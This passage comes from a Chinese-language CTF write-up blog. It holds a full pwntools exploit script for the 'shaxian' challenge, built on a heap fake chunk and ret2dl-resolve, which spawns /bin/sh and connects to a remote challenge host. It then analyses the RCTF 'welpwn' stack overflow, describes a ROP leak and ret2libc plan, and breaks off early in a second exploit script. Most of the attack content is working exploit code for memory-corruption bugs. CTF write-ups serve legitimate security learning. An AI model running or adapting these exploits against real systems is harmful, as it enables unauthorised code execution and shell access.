class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./shaxian'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'i386'</span>,<span class="string">'bits'</span>:<span class="string">'32'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x08048B31,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x08048912,malloc后，查看分配的堆块的数据域地址</span></span><br><span class="line"><span class="string">bp 0x08048B8E,Diancai函数返回地址</span></span><br><span class="line"><span class="string">bp 0x080489F6,查看要Free的堆块地址</span></span><br><span class="line"><span class="string">bp 0x08048B95,Submit函数返回地址</span></span><br><span class="line"><span class="string">bp 0x08048737,atoi调用地址</span></span><br><span class="line"><span class="string">bp 0x08048C29,add_ppp_ebp_ret</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'180.76.178.48'</span>,<span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            <span class="comment"># io = gdb.debug('./shaxian','''bp 0x08048B31</span></span><br><span class="line">            <span class="comment">#                               bp 0x08048912</span></span><br><span class="line">            <span class="comment">#                               bp 0x08048B8E</span></span><br><span class="line">            <span class="comment">#                               bp 0x080489F6</span></span><br><span class="line">            <span class="comment">#                               bp 0x08048B95</span></span><br><span class="line">            <span class="comment">#                               bp 0x08048C29''')</span></span><br><span class="line">            io = gdb.debug(<span class="string">'./shaxian'</span>,<span class="string">'''bp 0x08048C29'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./shaxian'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dian_cai</span><span class="params">(io,name,count)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'5.Jianjiao\n'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'How many?\n'</span>)</span><br><span class="line">    io.sendline(str(count))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receipt</span><span class="params">(io,taitou)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)   <span class="comment"># 程序中用的是puts()</span></span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Taitou:'</span>)     <span class="comment"># 程序中用的是printf()</span></span><br><span class="line">    io.sendline(taitou)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">review</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)	</span><br><span class="line"></span><br><span class="line"><span class="comment"># x86</span></span><br><span class="line"><span class="comment"># Elf32_Rel *reloc = JMPREL + reloc_offset          # 符号的重定位项的地址</span></span><br><span class="line"><span class="comment"># Elf32_Sym *sym = &amp;SYMTAB[(reloc-&gt;r_info)&gt;&gt;8]      # 符号的符号项的地址</span></span><br><span class="line"><span class="comment"># i.e.	*sym = DT_SYMTAB + [(reloc-&gt;r_info)&gt;&gt;8]*4*4 # Elf32_Sym结构体的大小为16字节</span></span><br><span class="line"><span class="comment"># assert(((reloc-&gt;r_info)&amp;0xff) == 0x07)            # 重定位类型是R_386_JMP_SLOT</span></span><br><span class="line"><span class="comment"># if((sym-&gt;st_other)&amp;3 == 0)                        # 符号可见性</span></span><br><span class="line"><span class="comment"># uint16_t ndx = VERSYM[(reloc-&gt;r_info)&gt;&gt;8]         # ndx=0 -&gt; local symbol</span></span><br><span class="line"><span class="comment"># i.e.  ndx = DT_VERSYM + [(reloc-&gt;r_info)&gt;&gt;8]*2    # 符号版本索引的大小为2字节</span></span><br><span class="line"><span class="comment"># r_found_version *version = &amp;l-&gt;l_version(ndx)     # 当前符号的版本信息</span></span><br><span class="line"><span class="comment"># i.e.  *version = &amp;l-&gt;l_version + ndx*4*4          # r_found_version结构体的大小为16字节</span></span><br><span class="line"><span class="comment"># name = DT_STRTAB + sym-&gt;st_name                   # 当前符号的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf32_Addr r_offset; /* 表示重定位所作用的虚拟地址或相对基地址的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Word r_info;   /* 重定位类型和符号表下标 */ 4byte</span></span><br><span class="line"><span class="string">&#125; Elf32_Rel;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x86_reloc_data</span><span class="params">(got_plt,sym_index)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(got_plt) + p32((sym_index&lt;&lt;<span class="number">8</span>) + <span class="number">0x07</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf32_Word    st_name;  /* 符号名，符号在字符串表中的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Addr    st_value; /* 符号的值，可能是地址或偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Word    st_size;  /* 符号的大小 */ 4byte</span></span><br><span class="line"><span class="string">    unsigned char st_info;  /* 符号类型及绑定属性 */ 1byte</span></span><br><span class="line"><span class="string">    unsigned char st_other; /* 符号的可见性 */ 1byte</span></span><br><span class="line"><span class="string">    Elf32_Section st_shndx; /* 节头表索引 */ 2byte</span></span><br><span class="line"><span class="string">&#125; Elf32_Sym;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x86_sym_data</span><span class="params">(name_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(name_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">DT_JMPREL = <span class="number">0x08048408</span></span><br><span class="line">DT_SYMTAB = <span class="number">0x080481DC</span></span><br><span class="line">DT_STRTAB = <span class="number">0x080482EC</span></span><br><span class="line">DT_VERSYM = <span class="number">0x08048396</span></span><br><span class="line">PLT0 = <span class="number">0x08048490</span></span><br><span class="line"></span><br><span class="line">atoi_got = <span class="number">0x0804B038</span></span><br><span class="line">system_got = atoi_got</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0804B0C0 - 0x0804B1C0 (0x100)</span></span><br><span class="line">Phone_number_buf = <span class="number">0x0804B0C0</span></span><br><span class="line"><span class="comment"># 0x0804B1C0 - 0x0804B1E0 (0x20)</span></span><br><span class="line">head_ptr = <span class="number">0x0804B1C0</span></span><br><span class="line"><span class="comment"># 0x0804B1E0 - 0x0804B2E0 (0x100)</span></span><br><span class="line">Address_buf = <span class="number">0x0804B1E0</span></span><br><span class="line"><span class="comment"># 0x0804B2E0 - 0x0804B300 (0x20)</span></span><br><span class="line">shopping_cart = <span class="number">0x0804B2E0</span></span><br><span class="line"><span class="comment"># 0x0804B300 - 0x0804B400 (0x100)</span></span><br><span class="line">Title = <span class="number">0x0804B300</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[fake_chunk] for [fake_chain]</span></span><br><span class="line"><span class="string">0x0804BF08 - 0x0804BF10  chunk_header</span></span><br><span class="line"><span class="string">0x0804BF10 - 0x0804BF14  count</span></span><br><span class="line"><span class="string">0x0804BF14 - 0x0804BF34  food_type</span></span><br><span class="line"><span class="string">0x0804BF34 - 0x0804BF38  next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[fake_chain]</span></span><br><span class="line"><span class="string">0x0804BF14 - 0x0804BF1C  reloc_data</span></span><br><span class="line"><span class="string">0x0804BF1C - 0x0804BF2C  sym_data</span></span><br><span class="line"><span class="string">0x0804BF2C - 0x0804BF34  "system"</span></span><br><span class="line"><span class="string">0x0804BF34 - 0x0804BF3C  "/bin/sh"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reloc_data_addr(0x0804BF14) = DT_JMPREL(0x08048408) + reloc_offset(0x3B0C)</span></span><br><span class="line">reloc_offset = <span class="number">0x3B0C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sym_data_addr(0x0804BF1C) = DT_SYMTAB(0x080481DC) + sym_index(0x3D4) * 16   (not useful)</span></span><br><span class="line"><span class="comment"># versym_data_addr(0x08048B3E) = DT_VERSYM(0x08048396) + sym_index(0x3D4) * 2</span></span><br><span class="line"><span class="comment"># ndx = 0x0</span></span><br><span class="line">reloc_data_addr = <span class="number">0x0804BF14</span></span><br><span class="line">reloc_data = generate_x86_reloc_data(system_got,<span class="number">0x3D4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x0804BF2C) = DT_STRTAB(0x080482EC) + name_offset(0x3C40)</span></span><br><span class="line">sym_data_addr = <span class="number">0x0804BF1C</span></span><br><span class="line">sym_data = generate_x86_sym_data(<span class="number">0x3C40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x0804BF2C) = sym_data_addr + 0x10</span></span><br><span class="line">func_name_addr = sym_data_addr + <span class="number">0x10</span></span><br><span class="line">func_name = <span class="string">"system\x00\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh_str_addr(0x0804BF34) = func_name_addr + 0x8</span></span><br><span class="line">binsh_str_addr = func_name_addr + <span class="number">0x8</span></span><br><span class="line">binsh_str = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    内存布局：</span></span><br><span class="line"><span class="string">    0x0804B0C0 - 0x0804B1C0  Phone_number </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [fake_chunk] for head_ptr</span></span><br><span class="line"><span class="string">    0x0804B1B0 - 0x0804B1B8  chunk_header</span></span><br><span class="line"><span class="string">    0x0804B1B8 - 0x0804B1BC  count</span></span><br><span class="line"><span class="string">    0x0804B1BC - 0x0804B1C0------------</span></span><br><span class="line"><span class="string">    0x0804B1C0 - 0x0804B1C4  head_ptr |food_type</span></span><br><span class="line"><span class="string">    0x0804B1C4 - 0x0804B1DC------------	</span></span><br><span class="line"><span class="string">    0x0804B1DC - 0x0804B1E0  next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0x0804B1E0 - 0x0804B1E8  Address(next_chunk's chunk_header)</span></span><br><span class="line"><span class="string">    0x0804B1E8 - 0x0804B2E0  Address</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    phone_number = <span class="string">'A'</span>*<span class="number">240</span> + p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>)</span><br><span class="line">    address = p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Your Address:\n'</span>)</span><br><span class="line">    io.sendline(address)</span><br><span class="line">    io.recvuntil(<span class="string">'Your Phone number:\n'</span>)</span><br><span class="line">    io.sendline(phone_number)</span><br><span class="line"></span><br><span class="line">    raw_input(<span class="string">'Stage1: Create fake_chunk for fake_chain'</span>)</span><br><span class="line">    <span class="comment"># 伪造fake_chunk的chunk_header</span></span><br><span class="line">    name = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">    dian_cai(io,name,<span class="number">1</span>) <span class="comment"># 0x804c008</span></span><br><span class="line">    submit(io)          <span class="comment"># 0x804c008,0x804b1b8</span></span><br><span class="line">    name = <span class="string">'B'</span>*<span class="number">4</span> + p32(<span class="number">0x0804BF10</span> - <span class="number">0x4</span>)</span><br><span class="line">    name = name.ljust(<span class="number">36</span>,<span class="string">'\x00'</span>) <span class="comment"># 修改fake_chunk的next指针,防止下一次Free堆块时进入死循环</span></span><br><span class="line">    count = struct.unpack(<span class="string">"i"</span>,p32(<span class="number">0x31</span>))[<span class="number">0</span>]</span><br><span class="line">    dian_cai(io,name,count)	<span class="comment"># 0x804b1b8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造fake_chunk相邻的next_chunk的chunk_header</span></span><br><span class="line">    name = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">    dian_cai(io,name,<span class="number">1</span>) <span class="comment"># 0x804c008</span></span><br><span class="line">    submit(io)          <span class="comment"># 0x804c008,0x804b1b8</span></span><br><span class="line">    name = <span class="string">'B'</span>*<span class="number">4</span> + p32(<span class="number">0x0804BF38</span> + <span class="number">0x4</span>)</span><br><span class="line">    name = name.ljust(<span class="number">36</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    count = struct.unpack(<span class="string">"i"</span>,p32(<span class="number">0x31</span>))[<span class="number">0</span>]</span><br><span class="line">    dian_cai(io,name,count)	<span class="comment"># 0x804b1b8</span></span><br><span class="line">    </span><br><span class="line">    raw_input(<span class="string">'Stage2: Write fake_chain to fake_chunk.'</span>)</span><br><span class="line">    dian_cai(io,<span class="string">'C'</span>*<span class="number">32</span> + p32(reloc_data_addr - <span class="number">0x4</span>),<span class="number">2</span>)  <span class="comment"># 0x804c008</span></span><br><span class="line">    submit(io)                                          <span class="comment"># 0x804c008,0x0804BF10</span></span><br><span class="line">    fake_chain = reloc_data</span><br><span class="line">    fake_chain += sym_data</span><br><span class="line">    fake_chain += func_name</span><br><span class="line">    fake_chain += binsh_str</span><br><span class="line">    dian_cai(io,fake_chain,<span class="number">3</span>) <span class="comment"># 0x0804BF10</span></span><br><span class="line"></span><br><span class="line">    raw_input(<span class="string">'Stage3: Write shellcode to Title.'</span>)</span><br><span class="line">    shellcode = p32(PLT0) + p32(reloc_offset) + p32(<span class="number">0x01010101</span>) + p32(binsh_str_addr)</span><br><span class="line">    payload = <span class="string">"BBBB"</span>	<span class="comment"># </span></span><br><span class="line">    payload += shellcode</span><br><span class="line">    payload = payload.rjust(<span class="number">240</span>,<span class="string">'A'</span>)</span><br><span class="line">    receipt(io,payload)</span><br><span class="line"></span><br><span class="line">    raw_input(<span class="string">'Stage4: Modify atoi_got to gadgets.'</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    08048C29  add esp, 1Ch</span></span><br><span class="line"><span class="string">    08048C2C  pop ebx</span></span><br><span class="line"><span class="string">    08048C2D  pop esi</span></span><br><span class="line"><span class="string">    08048C2E  pop edi</span></span><br><span class="line"><span class="string">    08048C2F  pop ebp</span></span><br><span class="line"><span class="string">    08048C30  retn</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    add_ppp_ebp_ret = <span class="number">0x08048C29</span></span><br><span class="line">    leave_ret = <span class="number">0x080485c8</span></span><br><span class="line">    </span><br><span class="line">    name = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">    dian_cai(io,name,<span class="number">1</span>) <span class="comment"># 0x804c008</span></span><br><span class="line">    submit(io)          <span class="comment"># 0x804c008,0x804b1b8</span></span><br><span class="line">    name = <span class="string">'B'</span>*<span class="number">4</span> + p32(atoi_got)</span><br><span class="line">    <span class="comment"># name = name.ljust(36,'\x00')</span></span><br><span class="line">    count = struct.unpack(<span class="string">"i"</span>,p32(add_ppp_ebp_ret))[<span class="number">0</span>]</span><br><span class="line">    dian_cai(io,name,count)	<span class="comment"># 0x804b1b8</span></span><br><span class="line"></span><br><span class="line">    raw_input(<span class="string">'Stage5: Jump to shellcode.'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"choose:\n"</span>)</span><br><span class="line">    <span class="comment"># esi,edi,ebp,ret(将ebp修改为shellcode地址,通过ebp和leave_ret调整esp)</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">8</span> + p32(Title + <span class="number">0x100</span> - <span class="number">0x10</span> - <span class="number">0x14</span>) + p32(leave_ret)	</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    debug = <span class="number">0</span>	<span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p>
<h2 id="welpwn-pwn200"><a href="#welpwn-pwn200" class="headerlink" title="welpwn-pwn200"></a>welpwn-pwn200</h2><h3 id="0x00-检查程序开启的保护机制-1"><a href="#0x00-检查程序开启的保护机制-1" class="headerlink" title="0x00 检查程序开启的保护机制"></a>0x00 检查程序开启的保护机制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file welpwn        </span><br><span class="line">welpwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a48a707a640bf53d6533992e6d8cd9f6da87f258, not stripped</span><br><span class="line"></span><br><span class="line">$ checksec welpwn</span><br><span class="line">[*] &apos;/home//Desktop/remote-dbg/welpwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们可以看到这是一个<code>64位</code>的<code>ELF可执行程序</code>，开启了<code>Partial RELRO</code>(部分重定位只读)，在这种情况下，<code>.dynamic段</code>是不可写的，<code>.got.plt段</code>(GOT表)是可写的。又开启了<code>NX(DEP)</code>使堆栈上的代码不可执行。</p>
<h3 id="0x10-静态分析-1"><a href="#0x10-静态分析-1" class="headerlink" title="0x10 静态分析"></a>0x10 静态分析</h3><p>&emsp;&emsp;通过IDA插件反编译后，<code>主函数</code>的伪代码如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> argv, <span class="keyword">const</span> <span class="keyword">char</span> envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">400</span>]; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">10u</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome to RCTF\n"</span>, <span class="number">16u</span>LL);</span><br><span class="line">  fflush(_bss_start);                      <span class="comment">// 刷新bss段内容</span></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">1024u</span>LL);</span><br><span class="line">  echo(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;我们可以看到<code>主函数</code>在<code>栈</code>上有一个<code>1024字节</code>的大缓冲区buf，在从标准输入读取完数据后，将<code>buf缓冲区地址</code>作为参数，传入到了<code>echo()函数</code>。下面是echo()函数的伪代码：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">echo</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; buf[i]; ++i )</span><br><span class="line">    flag[i] = buf[i];     <span class="comment">// flag大小为16,存在栈溢出</span></span><br><span class="line">  flag[i] = <span class="number">0</span>;  <span class="comment">// 如果buf中的字符串长度为16,这里可以修改rbp最低字节</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">"ROIS"</span>, flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"RCTF&#123;Welcome&#125;"</span>, flag);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">" is not flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%s"</span>, flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;我们可以看到<code>flag字符数组</code>只有<code>16字节</code>大小，如果传入的<code>buf字符串</code>的长度大于16字节，就会覆盖<code>echo()函数</code>的<code>rbp内容</code>(也就是main函数的rbp)，以及<code>echo()函数</code>的<code>返回地址</code>，从而获得程序的控制流。</p>
<h3 id="0x20-方法一：如果提供了libc-so，栈喷射-覆盖main’s-rbp最低字节，转移main函数rbp到rop代码处。ret2libc。"><a href="#0x20-方法一：如果提供了libc-so，栈喷射-覆盖main’s-rbp最低字节，转移main函数rbp到rop代码处。ret2libc。" class="headerlink" title="0x20 方法一：如果提供了libc.so，栈喷射+覆盖main’s rbp最低字节，转移main函数rbp到rop代码处。ret2libc。"></a>0x20 方法一：如果提供了libc.so，栈喷射+覆盖main’s rbp最低字节，转移main函数rbp到rop代码处。ret2libc。</h3><p><strong><code>利用思路</code></strong>：</p>
<p>1、首先构造<code>payload</code>，使echo()函数的rbp指向的内容的最低字节修改为<code>“\x00”</code>，也就是<code>main()函数</code>的<code>rbp</code>的<code>最低字节</code>。echo()函数正常返回到main()函数，但是main()函数的rbp得到修改，这样就会使<code>main()函数</code>返回时，<code>返回地址</code>落在了<code>buf缓冲区内</code>。我们通过将<code>ROP chain</code>喷射到<code>buf缓冲区内</code>，使main()函数返回时刚好可以<code>返回到ROP chain</code>。但这需要一定的几率，因为系统如果开启<code>ASLR</code>，每次执行程序时，<code>main()函数的rbp</code>都是不同的。</p>
<p>&emsp;&emsp;此<code>ROP chain</code>的功能是利用<code>puts()函数</code>泄露任一程序中使用到的<code>库函数地址</code>。然后，返回到<code>main()函数</code>起始地址，进行<code>下一次利用</code>。</p>
<p>2、根据泄露出的<code>库函数地址</code>，以及所给<code>libc.so</code>，我们可以计算出<code>libc.so的加载基址</code>。再加上system()函数的偏移或“/bin/sh\x00”字符串的偏移，就可以计算出<code>system()函数</code>的地址以及<code>“/bin/sh\x00”</code>字符串的地址。</p>
<p>3、再次构造<code>payload</code>，这次的<code>ROP chain</code>的功能是调用<code>system(&quot;/bin/sh&quot;)</code>函数。</p>
<p><strong><code>完整exp</code></strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># libc版本: libc6_2.23-0ubuntu11.2_amd64</span></span><br><span class="line"><span class="comment"># 方法：栈喷射+覆盖main's rbp最低字节,转移main函数栈底位置。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./welpwn'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./welpwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23_x86_64.so'</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span></span><br><span class="line">main_addr = <span class="number">0x4007CD</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x4007CD,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x400819,read()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x400782,flag[i] = 0;地址,修改rbp最低字节</span></span><br><span class="line"><span class="string">bp 0x400793,strcmp()函数调用地址</span></span><br><span class="line"><span class="string">bp 0x4007C6,return printf("%s", flag);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span 